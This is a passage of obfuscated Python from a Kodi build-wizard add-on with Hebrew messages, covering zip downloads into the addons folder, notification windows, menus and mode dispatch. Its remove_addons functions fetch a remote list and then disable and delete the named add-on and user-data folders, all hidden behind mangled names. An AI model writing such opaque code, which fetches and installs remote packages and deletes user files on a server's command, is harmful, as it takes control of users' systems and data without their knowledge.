				if not wiz .workingURL (OO00OOOO00000OO00 )==True :return #line:5160
				if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:5161
				DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון מהיר אוטומטי:[/B][/COLOR][COLOR %s][/COLOR]'%(COLOR1 ,OOO00OO00O00O0OO0 ),'','אנא המתן')#line:5162
				O00O0O0OOOO0OO0O0 =os .path .join (PACKAGES ,'%s_guisettings.zip'%OOOOOOOOOO0OOOOOO )#line:5163
				try :os .remove (O00O0O0OOOO0OO0O0 )#line:5164
				except :pass #line:5165
				logging .warning (OO00OOOO00000OO00 )#line:5166
				if 'google'in OO00OOOO00000OO00 :#line:5167
				   OOO0OOOO0O00OOO00 =googledrive_download (OO00OOOO00000OO00 ,O00O0O0OOOO0OO0O0 ,DP ,wiz .checkBuild (OOO00OO00O00O0OO0 ,'filesize'))#line:5168
				else :#line:5171
				  downloader .download (OO00OOOO00000OO00 ,O00O0O0OOOO0OO0O0 ,DP )#line:5172
				xbmc .sleep (100 )#line:5173
				OOOO0O000000000OO ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOO00OO00O00O0OO0 )#line:5174
				DP .update (0 ,OOOO0O000000000OO ,'','אנא המתן')#line:5175
				extract .all (O00O0O0OOOO0OO0O0 ,HOME ,DP ,title =OOOO0O000000000OO )#line:5176
				DP .close ()#line:5177
				wiz .defaultSkin ()#line:5178
				wiz .lookandFeelData ('save')#line:5179
				if KODIV >=18 :#line:5180
					skindialogsettind18 ()#line:5181
				if INSTALLMETHOD ==1 :O000OO0O0O0000O0O =1 #line:5184
				elif INSTALLMETHOD ==2 :O000OO0O0O0000O0O =0 #line:5185
				else :DP .close ()#line:5186
def gaiaserenaddon ():#line:5188
  OOO00000O0OOO000O =(ADDON .getSetting ("gaiaseren"))#line:5189
  OOO0O0000OO00OOO0 =(ADDON .getSetting ("auto_rd"))#line:5190
  if OOO00000O0OOO000O =='true'and OOO0O0000OO00OOO0 =='true':#line:5191
    OOOO0OO00O0000OOO =(NEWFASTUPDATE )#line:5192
    OOO0OO00OOOO00000 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5193
    O00O0OO0O000O00OO =xbmcgui .DialogProgress ()#line:5194
    O00O0OO0O000O00OO .create ("[B][COLOR=green]מתקין את ההרחבה גאיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:5195
    OO0OO0000O0OOO0OO =os .path .join (PACKAGES ,'isr.zip')#line:5196
    O0000OO0O0OO000OO =urllib2 .Request (OOOO0OO00O0000OOO )#line:5197
    OOO00000OO0000OO0 =urllib2 .urlopen (O0000OO0O0OO000OO )#line:5198
    OOO00OOOOO0OOO000 =xbmcgui .DialogProgress ()#line:5200
    OOO00OOOOO0OOO000 .create ("[B][COLOR=green]מתקין את ההרחבה גאיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:5201
    OOO00OOOOO0OOO000 .update (0 )#line:5202
    OO00O0O00OOOOO00O =open (OO0OO0000O0OOO0OO ,'wb')#line:5204
    try :#line:5206
      O000OO0O0O00OOOO0 =OOO00000OO0000OO0 .info ().getheader ('Content-Length').strip ()#line:5207
      OOOO0OOO0OOO0OOO0 =True #line:5208
    except AttributeError :#line:5209
          OOOO0OOO0OOO0OOO0 =False #line:5210
    if OOOO0OOO0OOO0OOO0 :#line:5212
          O000OO0O0O00OOOO0 =int (O000OO0O0O00OOOO0 )#line:5213
    O00OOOO0OO0000O00 =0 #line:5215
    OO000O0O000O0OO00 =time .time ()#line:5216
    while True :#line:5217
          OOO00O0000OO000O0 =OOO00000OO0000OO0 .read (8192 )#line:5218
          if not OOO00O0000OO000O0 :#line:5219
              sys .stdout .write ('\n')#line:5220
              break #line:5221
          O00OOOO0OO0000O00 +=len (OOO00O0000OO000O0 )#line:5223
          OO00O0O00OOOOO00O .write (OOO00O0000OO000O0 )#line:5224
          if not OOOO0OOO0OOO0OOO0 :#line:5226
              O000OO0O0O00OOOO0 =O00OOOO0OO0000O00 #line:5227
          if OOO00OOOOO0OOO000 .iscanceled ():#line:5228
             OOO00OOOOO0OOO000 .close ()#line:5229
             try :#line:5230
              os .remove (OO0OO0000O0OOO0OO )#line:5231
             except :#line:5232
              pass #line:5233
             break #line:5234
          OOOOO0OO0O00O00OO =float (O00OOOO0OO0000O00 )/O000OO0O0O00OOOO0 #line:5235
          OOOOO0OO0O00O00OO =round (OOOOO0OO0O00O00OO *100 ,2 )#line:5236
          O00O000OO000O0OOO =O00OOOO0OO0000O00 /(1024 *1024 )#line:5237
          O0OOOO0OO0000OOOO =O000OO0O0O00OOOO0 /(1024 *1024 )#line:5238
          O0O00OO0OO0OO00O0 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O00O000OO000O0OOO ,'teal',O0OOOO0OO0000OOOO )#line:5239
          if (time .time ()-OO000O0O000O0OO00 )>0 :#line:5240
            OO0OOO0000000O000 =O00OOOO0OO0000O00 /(time .time ()-OO000O0O000O0OO00 )#line:5241
            OO0OOO0000000O000 =OO0OOO0000000O000 /1024 #line:5242
          else :#line:5243
           OO0OOO0000000O000 =0 #line:5244
          O0O0O00OOO0O0O0OO ='KB'#line:5245
          if OO0OOO0000000O000 >=1024 :#line:5246
             OO0OOO0000000O000 =OO0OOO0000000O000 /1024 #line:5247
             O0O0O00OOO0O0O0OO ='MB'#line:5248
          if OO0OOO0000000O000 >0 and not OOOOO0OO0O00O00OO ==100 :#line:5249
              OO000000000000OOO =(O000OO0O0O00OOOO0 -O00OOOO0OO0000O00 )/OO0OOO0000000O000 #line:5250
          else :#line:5251
              OO000000000000OOO =0 #line:5252
          O00OO00OOOO0O000O ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OO0OOO0000000O000 ,O0O0O00OOO0O0O0OO )#line:5253
          OOO00OOOOO0OOO000 .update (int (OOOOO0OO0O00O00OO ),O0O00OO0OO0OO00O0 ,O00OO00OOOO0O000O +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:5255
    O0OOO0OOO00OO000O =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5258
    OO00O0O00OOOOO00O .close ()#line:5261
    extract .all (OO0OO0000O0OOO0OO ,O0OOO0OOO00OO000O ,OOO00OOOOO0OOO000 )#line:5262
    try :#line:5266
      os .remove (OO0OO0000O0OOO0OO )#line:5267
    except :#line:5268
      pass #line:5269
def iptvsimpldownpc ():#line:5270
    O00OOOOO00OO00O00 =(IPTVSIMPL18PC )#line:5272
    O00O00O0O0OO0000O =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5273
    O00OO00OO0OOOO0OO =xbmcgui .DialogProgress ()#line:5274
    O00OO00OO0OOOO0OO .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:5275
    OOOOOOOO00OO0OOO0 =os .path .join (PACKAGES ,'isr.zip')#line:5276
    O00O00O0O0OOO0000 =urllib2 .Request (O00OOOOO00OO00O00 )#line:5277
    O00O0OO00O0OO0OO0 =urllib2 .urlopen (O00O00O0O0OOO0000 )#line:5278
    O0O0OOOO0000000O0 =xbmcgui .DialogProgress ()#line:5280
    O0O0OOOO0000000O0 .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:5281
    O0O0OOOO0000000O0 .update (0 )#line:5282
    OO00O00O0OO000OOO =open (OOOOOOOO00OO0OOO0 ,'wb')#line:5284
    try :#line:5286
      O0OO00OO0O00000O0 =O00O0OO00O0OO0OO0 .info ().getheader ('Content-Length').strip ()#line:5287
      O0OOO0O0O00000OO0 =True #line:5288
    except AttributeError :#line:5289
          O0OOO0O0O00000OO0 =False #line:5290
    if O0OOO0O0O00000OO0 :#line:5292
          O0OO00OO0O00000O0 =int (O0OO00OO0O00000O0 )#line:5293
    O0OOO000OO000000O =0 #line:5295
    O0O000O0O00OOOOOO =time .time ()#line:5296
    while True :#line:5297
          OO0O00O000OO00OOO =O00O0OO00O0OO0OO0 .read (8192 )#line:5298
          if not OO0O00O000OO00OOO :#line:5299
              sys .stdout .write ('\n')#line:5300
              break #line:5301
          O0OOO000OO000000O +=len (OO0O00O000OO00OOO )#line:5303
          OO00O00O0OO000OOO .write (OO0O00O000OO00OOO )#line:5304
          if not O0OOO0O0O00000OO0 :#line:5306
              O0OO00OO0O00000O0 =O0OOO000OO000000O #line:5307
          if O0O0OOOO0000000O0 .iscanceled ():#line:5308
             O0O0OOOO0000000O0 .close ()#line:5309
             try :#line:5310
              os .remove (OOOOOOOO00OO0OOO0 )#line:5311
             except :#line:5312
              pass #line:5313
             break #line:5314
          O000OOOOO0O0OO00O =float (O0OOO000OO000000O )/O0OO00OO0O00000O0 #line:5315
          O000OOOOO0O0OO00O =round (O000OOOOO0O0OO00O *100 ,2 )#line:5316
          O0OOO0O0000000O00 =O0OOO000OO000000O /(1024 *1024 )#line:5317
          OOO00000O000OO0O0 =O0OO00OO0O00000O0 /(1024 *1024 )#line:5318
          OO00000O0O00OOO00 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O0OOO0O0000000O00 ,'teal',OOO00000O000OO0O0 )#line:5319
          if (time .time ()-O0O000O0O00OOOOOO )>0 :#line:5320
            O0O0000OOOOOOOOOO =O0OOO000OO000000O /(time .time ()-O0O000O0O00OOOOOO )#line:5321
            O0O0000OOOOOOOOOO =O0O0000OOOOOOOOOO /1024 #line:5322
          else :#line:5323
           O0O0000OOOOOOOOOO =0 #line:5324
          OOOO00OO0O00O00OO ='KB'#line:5325
          if O0O0000OOOOOOOOOO >=1024 :#line:5326
             O0O0000OOOOOOOOOO =O0O0000OOOOOOOOOO /1024 #line:5327
             OOOO00OO0O00O00OO ='MB'#line:5328
          if O0O0000OOOOOOOOOO >0 and not O000OOOOO0O0OO00O ==100 :#line:5329
              OO0OO0OOO0OO00OOO =(O0OO00OO0O00000O0 -O0OOO000OO000000O )/O0O0000OOOOOOOOOO #line:5330
          else :#line:5331
              OO0OO0OOO0OO00OOO =0 #line:5332
          O0O00OOOO0OOOO00O ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O0O0000OOOOOOOOOO ,OOOO00OO0O00O00OO )#line:5333
          O0O0OOOO0000000O0 .update (int (O000OOOOO0O0OO00O ),OO00000O0O00OOO00 ,O0O00OOOO0OOOO00O +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:5335
    OO00O0O0000O00OO0 =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5338
    OO00O00O0OO000OOO .close ()#line:5341
    extract .all (OOOOOOOO00OO0OOO0 ,OO00O0O0000O00OO0 ,O0O0OOOO0000000O0 )#line:5342
    try :#line:5346
      os .remove (OOOOOOOO00OO0OOO0 )#line:5347
    except :#line:5348
      pass #line:5349
def iptvsimpldown ():#line:5350
    O0OOO0O00OOOOO0O0 =(IPTV18 )#line:5352
    OOOOOO00OO0000OOO =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5353
    OO0OO0000O0OOOOOO =xbmcgui .DialogProgress ()#line:5354
    OO0OO0000O0OOOOOO .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:5355
    O0O0O000OOOOO000O =os .path .join (PACKAGES ,'isr.zip')#line:5356
    OO000O0OOO0OO000O =urllib2 .Request (O0OOO0O00OOOOO0O0 )#line:5357
    OO0O0OO0OO00O0OO0 =urllib2 .urlopen (OO000O0OOO0OO000O )#line:5358
    O0OOOOO00O0O0OO00 =xbmcgui .DialogProgress ()#line:5360
    O0OOOOO00O0O0OO00 .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:5361
    O0OOOOO00O0O0OO00 .update (0 )#line:5362
    OOOO0OO0000OOO000 =open (O0O0O000OOOOO000O ,'wb')#line:5364
    try :#line:5366
      OOOOO00O00O000O00 =OO0O0OO0OO00O0OO0 .info ().getheader ('Content-Length').strip ()#line:5367
      O0OOOOO00O000O00O =True #line:5368
    except AttributeError :#line:5369
          O0OOOOO00O000O00O =False #line:5370
    if O0OOOOO00O000O00O :#line:5372
          OOOOO00O00O000O00 =int (OOOOO00O00O000O00 )#line:5373
    O0OOO0OO00OO0O0O0 =0 #line:5375
    O000O0O0O0000000O =time .time ()#line:5376
    while True :#line:5377
          OOOOO0000000O00O0 =OO0O0OO0OO00O0OO0 .read (8192 )#line:5378
          if not OOOOO0000000O00O0 :#line:5379
              sys .stdout .write ('\n')#line:5380
              break #line:5381
          O0OOO0OO00OO0O0O0 +=len (OOOOO0000000O00O0 )#line:5383
          OOOO0OO0000OOO000 .write (OOOOO0000000O00O0 )#line:5384
          if not O0OOOOO00O000O00O :#line:5386
              OOOOO00O00O000O00 =O0OOO0OO00OO0O0O0 #line:5387
          if O0OOOOO00O0O0OO00 .iscanceled ():#line:5388
             O0OOOOO00O0O0OO00 .close ()#line:5389
             try :#line:5390
              os .remove (O0O0O000OOOOO000O )#line:5391
             except :#line:5392
              pass #line:5393
             break #line:5394
          O0O0OOOOOO0000O0O =float (O0OOO0OO00OO0O0O0 )/OOOOO00O00O000O00 #line:5395
          O0O0OOOOOO0000O0O =round (O0O0OOOOOO0000O0O *100 ,2 )#line:5396
          OO0000OOOO0O00000 =O0OOO0OO00OO0O0O0 /(1024 *1024 )#line:5397
          OOO00O0O000OO00OO =OOOOO00O00O000O00 /(1024 *1024 )#line:5398
          O0O0000OOO00OOOOO ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OO0000OOOO0O00000 ,'teal',OOO00O0O000OO00OO )#line:5399
          if (time .time ()-O000O0O0O0000000O )>0 :#line:5400
            O00OO00O0O00OOOO0 =O0OOO0OO00OO0O0O0 /(time .time ()-O000O0O0O0000000O )#line:5401
            O00OO00O0O00OOOO0 =O00OO00O0O00OOOO0 /1024 #line:5402
          else :#line:5403
           O00OO00O0O00OOOO0 =0 #line:5404
          OOO0O0O0O00000000 ='KB'#line:5405
          if O00OO00O0O00OOOO0 >=1024 :#line:5406
             O00OO00O0O00OOOO0 =O00OO00O0O00OOOO0 /1024 #line:5407
             OOO0O0O0O00000000 ='MB'#line:5408
          if O00OO00O0O00OOOO0 >0 and not O0O0OOOOOO0000O0O ==100 :#line:5409
              O00OOO00OOOOOOOO0 =(OOOOO00O00O000O00 -O0OOO0OO00OO0O0O0 )/O00OO00O0O00OOOO0 #line:5410
          else :#line:5411
              O00OOO00OOOOOOOO0 =0 #line:5412
          OO00O0O0OOO0000OO ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O00OO00O0O00OOOO0 ,OOO0O0O0O00000000 )#line:5413
          O0OOOOO00O0O0OO00 .update (int (O0O0OOOOOO0000O0O ),O0O0000OOO00OOOOO ,OO00O0O0OOO0000OO +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:5415
    OOOOOOOOO0OOO0O0O =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5418
    OOOO0OO0000OOO000 .close ()#line:5421
    extract .all (O0O0O000OOOOO000O ,OOOOOOOOO0OOO0O0O ,O0OOOOO00O0O0OO00 )#line:5422
    try :#line:5426
      os .remove (O0O0O000OOOOO000O )#line:5427
    except :#line:5428
      pass #line:5429
def testnotify ():#line:5430
	OOO00O0O000OOO000 =wiz .workingURL (NOTIFICATION )#line:5431
	if OOO00O0O000OOO000 ==True :#line:5432
		try :#line:5433
			OO0OOOOOOO0O0O0OO ,OOOO0O000OO0O0O0O =wiz .splitNotify (NOTIFICATION )#line:5434
			if OO0OOOOOOO0O0O0OO ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5435
			if STARTP2 ()=='ok':#line:5436
				notify .notification (OOOO0O000OO0O0O0O ,True )#line:5437
		except Exception as OOOO0OOO0OOOOO00O :#line:5438
			wiz .log ("Error on Notifications Window: %s"%str (OOOO0OOO0OOOOO00O ),xbmc .LOGERROR )#line:5439
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5440
def testnotify2 ():#line:5441
	O0000O00OO000O0OO =wiz .workingURL (NOTIFICATION2 )#line:5442
	if O0000O00OO000O0OO ==True :#line:5443
		try :#line:5444
			O00OO00O000000OOO ,O00O0O0O00OO00O00 =wiz .splitNotify (NOTIFICATION2 )#line:5445
			if O00OO00O000000OOO ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5446
			if STARTP2 ()=='ok':#line:5447
				notify .notification2 (O00O0O0O00OO00O00 ,True )#line:5448
		except Exception as O0OOOO0OO000O0O00 :#line:5449
			wiz .log ("Error on Notifications Window: %s"%str (O0OOOO0OO000O0O00 ),xbmc .LOGERROR )#line:5450
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5451
def testnotify3 ():#line:5452
	OOOO00OOOO0000OOO =wiz .workingURL (NOTIFICATION3 )#line:5453
	if OOOO00OOOO0000OOO ==True :#line:5454
		try :#line:5455
			O00000OO000000OO0 ,O0O00OO00O0O00O00 =wiz .splitNotify (NOTIFICATION3 )#line:5456
			if O00000OO000000OO0 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5457
			if STARTP2 ()=='ok':#line:5458
				notify .notification3 (O0O00OO00O0O00O00 ,True )#line:5459
		except Exception as O000O00OO0OO0OOO0 :#line:5460
			wiz .log ("Error on Notifications Window: %s"%str (O000O00OO0OO0OOO0 ),xbmc .LOGERROR )#line:5461
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5462
def servicemanual ():#line:5463
	O00O0OO00O0OOOO00 =wiz .workingURL (HELPINFO )#line:5464
	if O00O0OO00O0OOOO00 ==True :#line:5465
		try :#line:5466
			OOOOOOO0O00000OOO ,O0O00O00OO0O000O0 =wiz .splitNotify (HELPINFO )#line:5467
			if OOOOOOO0O00000OOO ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Notification: Not Formated Correctly[/COLOR]"%COLOR2 );return #line:5468
			notify .helpinfo (O0O00O00OO0O000O0 ,True )#line:5469
		except Exception as O000OO000OO0OOO00 :#line:5470
			wiz .log ("Error on Notifications Window: %s"%str (O000OO000OO0OOO00 ),xbmc .LOGERROR )#line:5471
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Invalid URL for Notification[/COLOR]"%COLOR2 )#line:5472
def testupdate ():#line:5474
	if BUILDNAME =="":#line:5475
		notify .updateWindow ()#line:5476
	else :#line:5477
		notify .updateWindow (BUILDNAME ,BUILDVERSION ,BUILDLATEST ,wiz .checkBuild (BUILDNAME ,'icon'),wiz .checkBuild (BUILDNAME ,'fanart'))#line:5478
def testfirst ():#line:5480
	notify .firstRun ()#line:5481
def testfirstRun ():#line:5483
	notify .firstRunSettings ()#line:5484
def fastinstall ():#line:5487
	notify .firstRuninstall ()#line:5488
def addDir (O000O0O0OO00000OO ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:5495
	O000O000O0OOOO00O =sys .argv [0 ]#line:5496
	if not mode ==None :O000O000O0OOOO00O +="?mode=%s"%urllib .quote_plus (mode )#line:5497
	if not name ==None :O000O000O0OOOO00O +="&name="+urllib .quote_plus (name )#line:5498
	if not url ==None :O000O000O0OOOO00O +="&url="+urllib .quote_plus (url )#line:5499
	O00O0O0000O0OOO0O =True #line:5500
	if themeit :O000O0O0OO00000OO =themeit %O000O0O0OO00000OO #line:5501
	O0O0OOO0O00O00OOO =xbmcgui .ListItem (O000O0O0OO00000OO ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:5502
	O0O0OOO0O00O00OOO .setInfo (type ="Video",infoLabels ={"Title":O000O0O0OO00000OO ,"Plot":description })#line:5503
	O0O0OOO0O00O00OOO .setProperty ("Fanart_Image",fanart )#line:5504
	if not menu ==None :O0O0OOO0O00O00OOO .addContextMenuItems (menu ,replaceItems =overwrite )#line:5505
	O00O0O0000O0OOO0O =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =O000O000O0OOOO00O ,listitem =O0O0OOO0O00O00OOO ,isFolder =True )#line:5506
	return O00O0O0000O0OOO0O #line:5507
def addFile (OO0OOOO0O0OOOOOOO ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:5509
	OO00OOO000OO0OOO0 =sys .argv [0 ]#line:5510
	if not mode ==None :OO00OOO000OO0OOO0 +="?mode=%s"%urllib .quote_plus (mode )#line:5511
	if not name ==None :OO00OOO000OO0OOO0 +="&name="+urllib .quote_plus (name )#line:5512
	if not url ==None :OO00OOO000OO0OOO0 +="&url="+urllib .quote_plus (url )#line:5513
	O000000O00OOO00OO =True #line:5514
	if themeit :OO0OOOO0O0OOOOOOO =themeit %OO0OOOO0O0OOOOOOO #line:5515
	O00OOO000O0OO0OOO =xbmcgui .ListItem (OO0OOOO0O0OOOOOOO ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:5516
	O00OOO000O0OO0OOO .setInfo (type ="Video",infoLabels ={"Title":OO0OOOO0O0OOOOOOO ,"Plot":description })#line:5517
	O00OOO000O0OO0OOO .setProperty ("Fanart_Image",fanart )#line:5518
	if not menu ==None :O00OOO000O0OO0OOO .addContextMenuItems (menu ,replaceItems =overwrite )#line:5519
	O000000O00OOO00OO =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =OO00OOO000OO0OOO0 ,listitem =O00OOO000O0OO0OOO ,isFolder =False )#line:5520
	return O000000O00OOO00OO #line:5521
def get_params ():#line:5523
	OO0000O00OOOO0O0O =[]#line:5524
	O0OO0O00O0OO0OO00 =sys .argv [2 ]#line:5525
	if len (O0OO0O00O0OO0OO00 )>=2 :#line:5526
		O00OOO0OOOO0000O0 =sys .argv [2 ]#line:5527
		O00OOO000O00O0OO0 =O00OOO0OOOO0000O0 .replace ('?','')#line:5528
		if (O00OOO0OOOO0000O0 [len (O00OOO0OOOO0000O0 )-1 ]=='/'):#line:5529
			O00OOO0OOOO0000O0 =O00OOO0OOOO0000O0 [0 :len (O00OOO0OOOO0000O0 )-2 ]#line:5530
		O0O00OOOO0OO00OO0 =O00OOO000O00O0OO0 .split ('&')#line:5531
		OO0000O00OOOO0O0O ={}#line:5532
		for O000OO000OOOOO0OO in range (len (O0O00OOOO0OO00OO0 )):#line:5533
			OO00000OO000O00OO ={}#line:5534
			OO00000OO000O00OO =O0O00OOOO0OO00OO0 [O000OO000OOOOO0OO ].split ('=')#line:5535
			if (len (OO00000OO000O00OO ))==2 :#line:5536
				OO0000O00OOOO0O0O [OO00000OO000O00OO [0 ]]=OO00000OO000O00OO [1 ]#line:5537
		return OO0000O00OOOO0O0O #line:5539
def remove_addons ():#line:5541
	try :#line:5542
			import json #line:5543
			OOO0OOOO000O0OO00 =urllib2 .urlopen (remove_url ).readlines ()#line:5544
			for O0000OO0O0O0O0OOO in OOO0OOOO000O0OO00 :#line:5545
				OO0OO000O0000OOO0 =O0000OO0O0O0O0OOO .split (':')[1 ].strip ()#line:5547
				O0OO00O00O000O000 ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":"%s","enabled":%s}}'%(OO0OO000O0000OOO0 ,'false')#line:5548
				OO000O00O0OO0OOO0 =xbmc .executeJSONRPC (O0OO00O00O000O000 )#line:5549
				O0OOOOOOO000O000O =json .loads (OO000O00O0OO0OOO0 )#line:5550
				OO0O00O0OOOOO00OO =os .path .join (addons_folder ,OO0OO000O0000OOO0 )#line:5552
				if os .path .exists (OO0O00O0OOOOO00OO ):#line:5554
					for O0OOO0000O000O000 ,O0O0OOOO00000OOO0 ,O0OOO000O00OOO0OO in os .walk (OO0O00O0OOOOO00OO ):#line:5555
						for O00OO00O0000OOOOO in O0OOO000O00OOO0OO :#line:5556
							os .unlink (os .path .join (O0OOO0000O000O000 ,O00OO00O0000OOOOO ))#line:5557
						for O00OO00000O0OO00O in O0O0OOOO00000OOO0 :#line:5558
							shutil .rmtree (os .path .join (O0OOO0000O000O000 ,O00OO00000O0OO00O ))#line:5559
					os .rmdir (OO0O00O0OOOOO00OO )#line:5560
			xbmc .executebuiltin ('Container.Refresh')#line:5562
			xbmc .executebuiltin ("XBMC.UpdateLocalAddons()")#line:5563
			xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:5564
	except :pass #line:5565
def remove_addons2 ():#line:5566
	try :#line:5567
			import json #line:5568
			OOO0O0O0O0OOOO000 =urllib2 .urlopen (remove_url2 ).readlines ()#line:5569
			for OO0OO0O00O0OO0000 in OOO0O0O0O0OOOO000 :#line:5570
				O0OO0OOO0000O0000 =OO0OO0O00O0OO0000 .split (':')[1 ].strip ()#line:5572
				OO0O00OO0OO0O00OO ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled1","params":{"addonid":"%s","enabled":%s}}'%(O0OO0OOO0000O0000 ,'false')#line:5573
				OOO00O0OOOO0OO00O =xbmc .executeJSONRPC (OO0O00OO0OO0O00OO )#line:5574
				O000OO0OO0O0OO0O0 =json .loads (OOO00O0OOOO0OO00O )#line:5575
				O0O000O00OOOO0O00 =os .path .join (user_folder ,O0OO0OOO0000O0000 )#line:5577
				if os .path .exists (O0O000O00OOOO0O00 ):#line:5579
					for O000OO00OO00OO0OO ,OOO0000OO0O00O0O0 ,OOOO0000O00OOO000 in os .walk (O0O000O00OOOO0O00 ):#line:5580
						for O0O00OO0O00OOO000 in OOOO0000O00OOO000 :#line:5581
							os .unlink (os .path .join (O000OO00OO00OO0OO ,O0O00OO0O00OOO000 ))#line:5582
						for O0O0OOOOOO000OOOO in OOO0000OO0O00O0O0 :#line:5583
							shutil .rmtree (os .path .join (O000OO00OO00OO0OO ,O0O0OOOOOO000OOOO ))#line:5584
					os .rmdir (O0O000O00OOOO0O00 )#line:5585
	except :pass #line:5587
params =get_params ()#line:5588
url =None #line:5589
name =None #line:5590
mode =None #line:5591
try :mode =urllib .unquote_plus (params ["mode"])#line:5593
except :pass #line:5594
try :name =urllib .unquote_plus (params ["name"])#line:5595
except :pass #line:5596
try :url =urllib .unquote_plus (params ["url"])#line:5597
except :pass #line:5598
wiz .log ('[ Version : \'%s\' ] [ Mode : \'%s\' ] [ Name : \'%s\' ] [ Url : \'%s\' ]'%(VERSION ,mode if not mode ==''else None ,name ,url ))#line:5600
wiz .log ("AAAAAAAAAAAAAAAAAAAAAAAAAA URL: %s"%mode )#line:5601
def setView (OOOOOOOOOO0OOOO0O ,O0O0O0O0O0O00OOO0 ):#line:5602
	if wiz .getS ('auto-view')=='true':#line:5603
		O0000O0O0000O00O0 =wiz .getS (O0O0O0O0O0O00OOO0 )#line:5604
		if O0000O0O0000O00O0 =='50'and KODIV >=17 and SKIN =='skin.estuary':O0000O0O0000O00O0 ='55'#line:5605
		if O0000O0O0000O00O0 =='500'and KODIV >=17 and SKIN =='skin.estuary':O0000O0O0000O00O0 ='50'#line:5606
		wiz .ebi ("Container.SetViewMode(%s)"%O0000O0O0000O00O0 )#line:5607
if mode ==None :index ()#line:5609
elif mode =='wizardupdate':wiz .wizardUpdate ()#line:5611
elif mode =='builds':buildMenu ()#line:5612
elif mode =='viewbuild':viewBuild (name )#line:5613
elif mode =='buildinfo':buildInfo (name )#line:5614
elif mode =='buildpreview':buildVideo (name )#line:5615
elif mode =='install':buildWizard (name ,url )#line:5616
elif mode =='theme':buildWizard (name ,mode ,url )#line:5617
elif mode =='viewthirdparty':viewThirdList (name )#line:5618
elif mode =='installthird':thirdPartyInstall (name ,url )#line:5619
elif mode =='editthird':editThirdParty (name );wiz .refresh ()#line:5620
elif mode =='maint':maintMenu (name )#line:5622
elif mode =='passpin':passandpin ()#line:5623
elif mode =='backmyupbuild':backmyupbuild ()#line:5624
elif mode =='kodi17fix':wiz .kodi17Fix ()#line:5625
elif mode =='kodi177fix':wiz .kodi177Fix ()#line:5626
elif mode =='advancedsetting':advancedWindow (name )#line:5627
elif mode =='autoadvanced':showAutoAdvanced ();wiz .refresh ()#line:5628
elif mode =='removeadvanced':removeAdvanced ();wiz .refresh ()#line:5629
elif mode =='asciicheck':wiz .asciiCheck ()#line:5630
